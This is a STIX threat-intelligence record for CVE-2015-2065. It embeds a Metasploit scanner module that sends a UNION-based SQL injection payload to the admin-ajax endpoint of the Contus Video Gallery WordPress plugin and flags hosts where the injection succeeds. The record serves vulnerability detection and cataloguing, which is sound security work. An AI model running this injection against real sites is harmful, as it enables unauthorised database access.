{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f0dcf2e-d842-47cf-9b0d-ade765803763",
    "created": "2024-08-14T16:30:31.498409Z",
    "modified": "2024-08-14T16:30:31.498413Z",
    "name": "WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner",
    "description": " This module attempts to exploit a UNION-based SQL injection in Contus Video Gallery for Wordpress version 2.7 and likely prior in order if the instance is vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_contus_video_gallery_sqli.rb",
            "external_id": "wp_contus_video_gallery_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2065"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7793"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner',\n      'Description' => %q{\n      This module attempts to exploit a UNION-based SQL injection in Contus Video\n      Gallery for Wordpress version 2.7 and likely prior in order if the instance is\n      vulnerable.\n      },\n      'Author'       =>\n        [\n          'Claudio Viviani', #discovery\n          'bperry' #metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2015-2065'],\n          [ 'WPVDB', '7793' ]\n        ],\n      'DisclosureDate' => '2015-02-24'))\n  end\n\n  def run_host(ip)\n    right_marker = Rex::Text.rand_text_alpha(5)\n    left_marker = Rex::Text.rand_text_alpha(5)\n    flag = Rex::Text.rand_text_alpha(5)\n\n    vprint_status(\"Checking host\")\n\n    res = send_request_cgi({\n      'uri'       => wordpress_url_admin_ajax,\n      'vars_get' => {\n        'action' => 'rss',\n        'type' => 'video',\n        'vid' => \"-1 UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \"\n      }\n    })\n    unless res && res.body\n      vprint_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/\n\n    if result\n      print_good(\"Vulnerable to unauthenticated SQL injection within Contus Video Gallery 2.7 for Wordpress\")\n      report_vuln({\n        :host  => rhost,\n        :port  => rport,\n        :proto => 'tcp',\n        :name  => \"Unauthenticated UNION-based SQL injection in Contus Video Gallery 2.7 for Wordpress\",\n        :refs  => self.references.select { |ref| ref.ctx_val == \"2015-2065\" }\n      })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-24"
}